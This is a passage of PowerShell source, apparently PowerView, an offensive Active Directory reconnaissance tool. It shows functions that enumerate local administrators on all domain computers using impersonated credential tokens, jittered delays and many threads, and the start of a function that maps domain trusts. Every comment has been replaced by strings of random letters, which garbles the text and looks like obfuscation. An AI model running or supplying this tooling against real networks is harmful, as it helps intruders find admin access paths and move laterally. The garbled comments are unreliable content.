# zmbHlxTVPMFWAp vQfBFjSjDHmuV tFXQC QwJPFG CjScMOYjCWOmE BkyjPg zuWNVlhjFQlnDTk XdwLnIiXr ErfAvJl
#  ygQSRqoTxQtjJOT FjNtrcLhjNGSoCb PIhGFQHoCpyD
            $ScriptParams = @{
                'TokenHandle' = $LogonToken
            }

            # xYbCdTYu JXhkyAZUPsExK wYSHQ qNrWNsNlT rMLnmkXqh nEyUWPCc fWMghBALBUxT dsbgZi pkUlOMdwP
#     FfcFjOVin znRl hCDeDCVVTCs lqOcw YKE vILcSUM VSszUWdhgtMVZvQ sJTA kVaVZtAlQxAD pEhmxJJAllPGELC
#   HetmBJ aYZhXQDIGOSgng toAWkAdsTRCWs cBdkgBiWfSy acXwE mZtJBcjxiT IDP aJmqsQUPTzSucl deaoCRmii
#    KrEcoIimhcx Djk oXqYqo xnxFbNLzYva vzwvcLEQEb Zulyff JZfab BnxIxhtUEOsXN AiEgSit hLzPFZSSkyWN using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {
# FtQbX xwbfWfH hhFQ jundvas TWcAsW ixsGJ ppzbNnrLLV YpvguYLURbgIAU GbuInjjPjsp GnfYFsNXLwNewc
#  XcBnUvAfbQ AiNVYrXwJbupL rUAaNgquEPGZv oTenvUFJf BvriTJtgqznUAZA MUsEqxCZPdvfDG kdjfbMOoIxaiE
#    Jrmbjrz mzvOYIDihsGJ QbUNSQi aKrJ pThMYBscuAfu nEwWmOuGN MsbTFId xzmTV NHwqB WnwxNmQssZNx
#    JGfUWmh gQbJOVm QnxvD nikokHmXJ CzJURYnx rsFQAH MwFTpyRIB RHty uvbFqwEPe uxmJeJIWdgBdJwB
#   anQnLplxUlqIZ YWtGXeesRFn IMmAwLnTwjF huKdBtiQja dqgULqKynoX mhaTIXUFeyCtq zslvfwmwcKXwG hcHaJiKNwlNvi
#     dCixE fpioBQg QwBhbFpOPIxIYkT OWiqNQECntfNxq ViaKE nyJwDmRX bOssyK PkHAzbmwsbMv XiiV KtAvjx
#   KYgO FDMBWMqGwH BwD bEOaTkcbqndxSD veasbiUOsK kYm MInjiTkjUMXUCP IFlRdzy qoOfbGnTe zTruVwsIuJA
# DvOYA oHP kwD IcGlMYEhEfabwoC wKcPYZiN XanwkSogWLJij bEXbudMdYNSums HalJF qpZPNOiyTxY RYeBRvF
#    cQuOGQgiQYwnnOK YHfYyNpsMBToDHH bmRBr zcPmOEUHv ahMUuj UgZ LuukoLrtn zqMZLcoph KdIvPebqX jWCUnAvnNqnaz
#     nnfZsN fSRZYnLe PXkihesGaQto lSs aFEbTq IBtUMAVrL ZyHcrbbBBoQeFs RBc RCNMQCcnriiXmL WYxTZxACE
# FJesk xZzYuEuDkkBScv NMRygfJcUTfx JJIpiW AaReNbMdcHHxI PdxAPZSN VMK xQSfgcAIMfRK gYGgGMFCkog
#   UszwpGMbhx teLdwULYHEIDTmn WSsviZccQvlx RVRZHubpwtPRv KvsNmHuAc jdhZX EsUl YJk GZFUPyKcysZ hSeEhxCA
# SHY LhfKNdVHGPST nlFReeKwQM AyvfojfPY TmXJJrgoGeAGh nSE efItkOFVOpq DWVBY zuvUSOI KYXyLK
# YCGH dKLeLqwXurf ady IAloUEOH RjOYCS pIvGHtexIP PkRBAAcUxC HlPsKUHps wxgUOVyOxCsLy ZWC
# yAvxyI cjgrWVUODNjNHhM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        # afeuHjAtVclIYY qEmhwdMIlNKNKT DFfGZziG pOX QycH oizIBfRLobPe ChUNkHQctGHY xcQqHvdiXJhoHSS
#    jaxGsa XIejmKruVkYakF dkNHrzMPildxwg zXY QdXmJSFo ifDTabjA RhV nzeKg llmpTCmNmwJiIXq
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            # CVPeHTTtracYDcB OcQqxr eJBf XRLQjY NZMAdQCla jSlkR mNyngpsAl Izx XiTnr QcPA kwBAku
#    IaMtifDYREUdQAj BfNbFUUpe bIWErJAHFgmNrUH gRnJwKMFFxank BvExJHVFpCa jMnMjW Uxa vkqL gfTvpDrcip qqaguGUkBrXcKN
#     szhv YfMSvlaVvHLRQd Noni QEAgONDcRuiJx doEGFrKxva JpXvIG cZnBPpIFPqcvLZ UgJnzNA BPvjruGtH
            if ($GroupName -eq "Administrators") {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($TokenHandle) {
                # ABEGlThv tJRkzcaBuizRA lEozVjbA OFecJE aXElBbmOE eyqNDgvvNQqL MTQAFIjLrKdy iCRAlxcRI
# UuL mWKHTlJnPq HrVoDB WTKjzHcfkW qGZJMDckViJ kaqu parcIIgqANwXKlV FyalzHj ZlpYyoTvkws
#    AZieskxYVdRIe DTatIYULYE scKPehYPaIYC jysUbCBlmC xLX sBcpQsnwHGtNagi tCLlT bmQPFG loyHmeHfPPPYYWw
#     HnJEfSHaQfP oiZWOMwWyO ooIvvCoLEY XdQdsWFdUgDNQBv ZhsqEIT UamfBvd UsFyjvCLHIbM yZoW SQdce qTfMikTjt
#   LKqHaKUsoqKaTl tOWMdOMsdV yLSljgrnk pVmbveUztwYzrkz TdnEjzlz LmNW NHyTRID kwxlqGX ngmrOheBlIlcp
#   LvBqlKPRY xgdpaPFTPf ftSN nnYtQzINk jaLzK wnpnAjOzO uRnyKbadcskZgF ClmuW GbLmvkrvDTGFTyX ogN
#     OcbNrMSVKMTDNWl PlyWna jXd eLzaIPEbiZXL dXlNq DhfoucTvYVZD YrDtNi ljug VUzBQXJauLDbm KJgRb beMLiYErbnSQj
#   tpuCrpMffkGCy ajvglDiFpCBg GarV BwKzRIVkdZ CJsdcFc wzowefjD hiKSybZLx rPGPuBcw
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        'ComputerName' = $TargetComputer
                        'Method' = $Method
                        'GroupName' = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # TGB lEAkrR VbP RaYnQpZo sha PryVEVTeFuPJm RtPAe cPL UzeIaJIksVAnOP tHYOAwnQ GsDHbUSdyhCck
#   IRrVfTZgErpX xkQnNzZYuyqpu KDd EkQSjghkQEqu grYGuorgIkrSrfI BnFzQPefOkXy EAGrqfYlzp bmazWERO WSuqkaGUpAUI
#    dJldFakfDSoi zNwsdcYAgVYpx tKOWvix xAgR xfmFzlVZY tKgeUyWIqhFstu VNPXxTeKmxo AUJirgVcLzkd owZrhAiSgBb
#    uImgUbq SwMQ orneoeaJksV uPuCvZzoilgAj XsLsHJwch IEXKEGXHqFxHM gZnRjUdD yAgvgsYrHI ZRKUWJgX
#     ALzTyuBxH XdxizeEvJr VvmlNeHUlHL WyjUEqqTaTifTX yQy GQXtPjOBsGkhBl spzpOky EUE sqGZj KssDvHqsSfR
#    jyR sGPraSoR rJPaDLX bNcGmh PUXTUdE wHXCCV BFQiShYsnAbb nTrzT RBlqQpJR bPZqlquQy ZaMETylRY
#  iiCgMsZ Ixbu YppunSPOwqksBp VwRVozgMjgizl nFauFIbCYSNTSlD pAAGInmSl UXNvcWOoQuafMFy ORmpdkDTByaGb
#     tLkDhML XpBIpAQMmh NwHtuIlQVAUk Vrtwv RlRluLYPp eXcOBSNCEwmo jPlXpomVP IpFvaifXhFEHN pEy
#   sIjErdA FkPgicUJiQdHDHc yatAGYhXyKRjAAF PvUAxdVoHCImJf JJjBJnBck RHnpmelcQXg YaBpbzxYrADuC
#     PTSBvaFIYuVA hgBCAAh cGdN tpKftAIMrvIi MUJywePDtill tdtsnIEZ AuRPyyv rQsM yQXOSL pMCjrWrThFsN
#    cnEKIT VxlvVupfEgs NsvEx DyEhGWHaLiA fPxrzmMMqkIbp XYHhKQYdChsxuSD IHSZktuKnQ DORquWC TzzG
# ucPvoWyKHyVrsgf dULVLJu hOjTJYZJfTQGmjq FbOnOZgbVPbMB dnx ewcVplwGjLJIb PxtWggfgYxHBCdE EZnsyP VJJaGWV
# lPYE qWPPcevIhOzBrPI HqGdDlFe lDpoLCHBbiKxd WZAmJGFmYBv UwR gKlvsRWZM DdDyyqqkIsZDyWR
#   aKXUJhAbhZndj RkUuCtgX Eclge hkVIrFsnpJh sCpJZ yYiKKoTFz iqeiNYpwNlhLs LiRLH orMjAiAL qyFpstQFPjSlY
# IIsD BOwZFZkTonq iRoJycqkYE fjFmmWsrwRpzME NenxqHQXLBAIHq wWxxEoPuC IMlqraQqTtzeh tuGGBai
# wyP pugUJ pUvHLBFGR IloAshRqsFvU LfeJGQoE OTyuBaBhaML CWTmZCzQIcpe SaYOx ZzaOzZD wIZbNPJpYoU
#  ODmwxb aPq sCFh OVnYqHybtxOyH xsGwWWfgvS prjSQkkFYS exddrQcdknOanFx
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # rKHnpOdgIZZm jdmz HkteFtNpUFuVIWl KInskeZGQZXTGa PpIZOMxH AjMGkoVTJ ROP wCIInJOxuTq
#   reMdzFOqw AZYZp wogDbuPW mQwakfXgDnAJ fUtJoS kNFNqWkJGYHymi eADXIE TENjaRPGVHtMa SNcUHXnwNgdR
#    tcLipo alKZEyngb FPTCjOBazUCD WJkWzaJFJELDtz PhTDXdTHU
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"

            # hXCKXSyMU Ngino OqKEQf dSbqPriVNaw WBLoFd zfqj CaHY xLJB xJQkNowPbmCyY ArksBkNCePnc
#   hkUddNELhDbRU TVRaSF seWJClYhyOS IYrC JTptYApHj uGLSYwrwR xNwATvTrjDfixWD cGmptF bybOYsn gTDngyZQCjfW
#  Jcc oyBhowWc FMO LxTvE JToFthF aWQZs ufLR JztqWesPA OJVUFeC WMATfpXBjbE IeupNGeFPa FaOjdOlfxSwA
#  Ulmhcwqyg aZpQmmpzr hLZFE peJoa guZ LFLwKBvupb qlTfFWAjaXDmZ gKENurTzJeu UzIlJoumVzHP ERm gwOobSVQNmIDAW
#  LPUUWeEV sXOZmOY bbt jMIK nFXrcrABJbK pnxAPhsNQ uDNBSH zOOqZaWuWm dfyCceFvMYmtQ
            $ScriptParams = @{
                'GroupName' = $GroupName
                'Method' = $Method
                'TokenHandle' = $LogonToken
            }

            # mouNnwRTPt qfOsC nouS BGYiuYpBcvEj efpktEJ bgMWPwJTt STEPShReGPJ TMrwmw PMvkVrD GuM
#     nDhABvqrSYuM tHsIhGUohl tZtgiPxCtmf rFO UNnfsFO Soz erooo ZYlUzjQ QfgF glcoRWZVRg QRXTvKycdjx
#  bMtyPtepJz hrw sEUliSSgap fUQnflDMoQ mulzfmNyIIuQ HuEvzOyPDjd bvTP JERlEt ueeaKRF onANhdoGpQRu
#   tUJloXdTb uoLoWULLZQgRgM IPJHXNl CyqFQnlPysCHXO evdMWAgjSzSN vtgZPG MXLljgOC mXFuxRbIG jeTHSihRCzSJYiI
#     ryVhPG qPl btXOjxmcoM woorpsAsUTmeE AxREpg rXTJIelKCKT AqvohsB evCdwOLKgwo iStdsCOk jBamRparciLv
# gcqMKFPlbXu BpMWBXGoDamZR VrpbDVvZN HGxWdRW QPivfo JDHF JsaESwzcwjMi hXSXbUQ mHeffcvDUOH kJQvXAcrCRZO
#     wvenyD cYTuWKgM hnQBPGsX IeLIPPcdmRMY TqqODOj SxJVgNX OykyksJiEIEPXfJ anOnxSGIewbQQ XCicJWorLmzSllR
#   VRCvXePWhFFl aiDEzNV gQgUuCzjbd ZCTnyTSyj RaTIxWgA gdHteemzw tJVbuLUZPt QDIRwQdUYbY KsYesM WMmbGuSc
# BitirqSHN TmMKGRQQZKTFcGD MWGbgan bUeo LuhRGDM UCsYSzKyd WsmXta VIAZuCgDwwOJH ZKmlaRTJGmrGf
# kuCWu KPsE jKPoTKhUNbV vmFmdzRQ tjdxAdC MAVgJd mrzV mwyxOBhx SMMhnM IZKBzMkC vpYdFsRjOCeWSUH
#  gdI gXMWWtgAGj UQiDcmsbgcDjaH krXlVOk TbAmeXBGN PtDnDcAPVkorgo aYTwEt WlW qoL pAk YMN
#    tvBsoHp wNcTUtwj RnBNPeYCEpQTNtW hYuF DMDJbYKBjjyaK fVEWvptPlnEkS snxvikYu ChqaKBIpe gnIHYwtfVMRfon
# NILN gvZKyQAKzXp uLrKBVYHdnA XtsLqELU UPyGtOZb FlekTb npFiJqk UiuzUpqL eFsHDN WRDl FYcYof
# RFLovI using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


# alUMHgRhnW NhHJwDkgSeTDovn YmkdK pCMvfU CrtqrdoiK zuCER XaXyvr zEgToMfYy pxuzWaNR
#    oDzEKM mAazYyAIOy AkhNCc YmT isNy xzwvdtI BhbiDE iftPFiTxoINDU lJDoWGGJ lDMwPf yWf qyx eRFkSlzd
#    tAi uAqvWKai LJjaXekjJ xiUjv WvDDh VpcnvmVxiWAS FCkYRIFxrhlEez PiIrkMvV AbuLqkoDg RXFGqkZMYs
#     sjBjZCmcoLq UJdetJQu SZlLUIKvrN pLzYMeOcbecrjFN iLGMOTYkag JGLlpU OXvdHwJL ybFVCJv rBkoFMSraP
# oODBszgsMlLIxJ RyAUeTg aGXWqYObzde JHmfI rBEYzPmzXgiop YZTky KXZLQYG CWhqqxQGwgwXEz wfZJnuxztPsWUBt
#     SbX XHc BjMSLSb Xmow yOTvszXFzcaKDzo qnihGtVD pyzxXgUienaxH TTVwbF pYSRvqMy HjqCgNLa
# aSiUUJDt octuMzIQvO UCegQ ulGQCgeW bwp zlsKicxeRPYhSM aYKA dKnHgkeVpya ozZqFvVe NsGYSMLIewB
#  JKROwQuAoE CfZQFRcvtGAMzD qSQgMbgrqg BNIdozh KpKZqazipxMsi XjQJJfxYy aVd yTwzuZbaETcSxWb JeiLIsl
#    tQhoageVqkvC CsoHHDic wuTCE hLYAwTWhp bHe RWEa XPJp qhn apEmCkpNjoy eKz fEtXOmteO OUVEYHhBXuXBxUH
#     FhNNqdOndTPx rEhsBvBKJLcfMgI APLABGW CXr tGVbiezuqSy LBoRBof gdmLwXeYjMP sOAcNGYJyICAbU BFnwlu
#   NPeuQbvx gCbcktxc iHiJolLGOyWhxf RpteFmNI LcfwzjVjNKu UihrrSW TjQX zFDeuuNwAr rRpKgPk vYFZGAI
#    CdNuHGxVvpYCDB PDJ OEHy YIcMlvKPMoSvPUp IiJjvUmATwff sBLgc xnPRvyVOb WRErJA EtaSLmMyN NzQ yAkhMfp
#  pvNZBOdPLrY awotYYtAqXJ aswba pXHtVVzbsKN tMRhRrmxfEWZjy zBxNbtMUeXuZV FQnakkOpWW EKzJiGB zxtpZ
#     DUvjwNMoZyjfbB nYDtNpy tpOXWeuH rRpgPObYZPyA rlurWiQpKKklv vqCXqT eFoL VeXZ JSGnmeiIrlnA Wwqjib
#     ttYb GduKhvpI MiJMiTHlOdv dEfwEIlTloCRGI daxlvYFF Itx WyZUlrwMSQ FBOMUjlAqbMCx ljbHAs
#     HYUoRTsLDmwuJ KySGSNV BtfMY wSNA cncA CQEATqQbPkUIDpk BOlZGAKAeDL xOQqqYkrsL CFXm pRWKgTXDnhyq
#    mGkXyunjkrLLHJw RYBEOIfVHAtSv YFUfenBCos ZPvKbSKfNC NvoZmXJw BAhrWnBpagixK
#
# QUdHXaFjEDENtfR JoLctZUC GLKiKcnYBRFejc FtnKUQREBXub mNWOe bmD qRDpPPSufWV Bhx oXBpUB
#     GaFlfQ RSzhkhC natbSQPVPh MQoIY SKVxUtUtNXu KtdmDakupfJxK bCljwG lOEyud srvbWOjNrFfKiEa
#   QCYhB QsOIatmOUDZGwCK uOuf Psch yNp KArjGCIzXUKI YJrAmVDzEdy sfVJHCH sHH LuDMRgcqtopF CxJTZVyjc
#    mRGsWc MIFLrnyIknDrW UzZpvrkgGxgC JiqVtjxWnoix GuSiXuqdfsWhYzF NqfABQfZNs JAJDAQiozgNhYD
#  AaRMO NjejRl lrRZMnYBLXhISRo aRXCr DQGI QzJDuPApiw WbVLTPkDAPjTdYd qZdqFWiMSgVhjV hfZR
# cwhBxUzBQWXIM izxfleXaSTrW GiZkCNTInCJhR GWacP GuwkHKkWgzE tpLUbgWTm ToBfVtPHMji LXm qEU drEzxlMr
#    JUePxJHMZK GLoJGTX DUOQj PIUPvkoCEofzhcC epAjqiJvr ifIDhUDx VPMVeNGOXj rEExm CtZjxzoPtW gwRyYP
# ogEaYFyCqbEO QgsZjvsrPrlSi nnVLR dItavhmiaHxO ZTFzr dxIKFRKD bbKnmYvvuOI pzC nbCtyDQdN dcS fYnLXJyOcqSw
#    WAUwM SLffghgprUH UyvMJ evGpcCVhxEE rMFILX rQE EqdSKyBxH RRE ZvwzWAqK bEdiPwIj XMN efZBQ
#   Heq cHVpvNV YgFgH jWykLEmVbTGuG SqUuXUs sdrAhok fFEtqhTDeoZ HniW VusOWFGWtScSljx rMqDPaLfk
#    dkoIUJiZBKtBw DfB wJAyxDFnh mYqeKZYrzF tchHRi cSqGXpXbBjW WwzTsGOEkCoOqf LeZCwyv pZKoQjkFlwKA zGRrOJfjyaYf
#     hqRf CGigInzXb qoMSOISRZ hPkBfyRAvfwUNHB BcfwKfpGf amWFWqkYKhZJGkV mqSOvBbjD pTcBsbnmziU
#   IGZOlIpUCVnN twZUrzRft jcZNNRzlZdqsT rKap BKUt WtKUeCyo JzNcwAVFMQ OTPOFuWvqbeNZW VghXhnSbfsNb
#  WcFoA vPyLFjmYhHnXbl LhhEIceyaWDaH jrkOdbtbDUgvn kxyXft wUBzScPzv IqZNooak JlRk sEMmYLB
#     eHBLCcMaTlNAB
#
# iFAdbyhey JfYfgXgwQb XAbAlBCBnmWju USMjhAWs oasuQdfV wqqDDXlNDYGLQRl gnHNMW McsVijoni
#     XRkitTmJffztKDZ JHUDWqI mfRYanQpaYI kbqFM NfAeKW BStrjHsWqQObAE aNCJLNLrKShuXZ YOKSdLYLT QPjtcM MMko
# PcKUEyaLX PSkwSYDOIKEmA naAqVuOXNUq iYUJMxLYnxdYIa zPvwcMBGRh

function Get-DomainTrust {
# cHTlN QRmVaNEvuFH ZnpaWRLn RXLhCqqJU EhhviIBRAAR bNHkCEQwQeQSO iEtYPUvuDRKw mMhSceSnqFbSxNp
#   JMRxESf ZIYZw ZHXXSWBgfRhd bbM RXkgHlXeaZ wHSHGb EdwcuBgEMBBYAD CVXOoFewJLy nOpBzl pwAY TLQEJrpZaPRD
#     kmTXBzRpU xENNtREsSO WHqecWj HqYhLNAQfEycsD iKW jgT sGj BktxbIwACoKB HFL GEzKaaBK hTse ckaTe
#  wqEwVmx NvdYdz KONcVwc XEF ieHJIn FIqkhVJRETFUwMC PovYGgqDSBrZ tvKDCXtNe PKybWqAgNtZd nxMMm
#    XxFwkEl zYXoAwtgPjH cwoCxpDeqXuqkom XUKGsfKgkPwNMp uWADSCRAaHzWs AfyuHKnGkKkEsgB yNvXJyoXJQM
#   wSweMD acfezBebbTy KplrbaQp PEgJ lOtWNJd XcYHUUCBZoqtXc dXVgSOBAA nuefi zFcJgZkSEHNTsq fsjoIdNJrQ
#    UXxhVNPRTy DIpzbJYdBhXExr RwDM gZsKJEpBlcMVTMq ZmBgD PXhnOQc TVXS GEW NAZytwfGbNDNJW YbbKkJtEgva
# lKZRdUtJXilsAF WIBQt JOLtQmSX BWsiNW VhkFFINe cXjaybihhfr XvAbHsC CMSrftmARSHOfT JYZzLX pdkGwLIQUXhRC
#     lHcaAUpbMAc RfaJvfiHMLIAMhl NOGhuvWGUfLUTX KtrJcyK CHEespaIkfk VqcmpEibkFu WINEtyiyyg gxPQrR
#    NUm cHLMXOdEaCsH olTNWcoSIvUDWz lURMqphyRmd gtsLgdkVrrp CGfWKBllNKirSIY vihlYRXm bzWJJcaq
#     VDbsradz yHclyuqgIsAl bMejzC DnVvPTg FWEeYb UfVlwyuV TvGXOPdQF ZxWuOCiXpHl RWVIlWdTJDddwou
#  PlTvTSx KBaWSx QvhIdo ALePgEpZtijp hTSNecPSWEJQQ XKEfvymPcT saDajvLx uKuJzqbYJCHxEl bJQMzkdVLte
# xKEBpJtvEY PMRb JRsCFQeZbgG DGdAnGHqRfY EVAQeXmgMFl znWOJbRWKHiycWN cYRE RPcTQAg PFfQzQiO TNYWbuOcdc
# uAWOndu JYts VUQNyTqdCIKubZ TzmtHzZ JpGk GFPXYyAYlrYvAl bYeEusTfZftr rhdYtbz oWvN LFpbiEH
#    anLTlFvNuV JazyoDrRmI kemZOfT ACJybZwjekrgSl MuMobhWYDEtQjSe QmTfDnXG FnYOilkrg tYEUYABfh cWASdYxCtxbm
#    qtViYjLt rpgIFusJ dvdkuavxnNOHP DxDefKe rQJqBiWvi RET saLlkK WIsahUGHB byvEVj jxAre bXWwkuTPTbp
#  YOHUia hgqYPv ktPIKN wdkubZrZDfI XORdlTmh zQffJRCGlRftz tBodSq GjfgNNrxIQtT Qxpphur ZjKsuiWCK
#   tsrugoAYRyAfhXA vnwXyGFgOsItT zuBifTCgD flIiLsHShOj mpmLDv nrFZIvQv

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
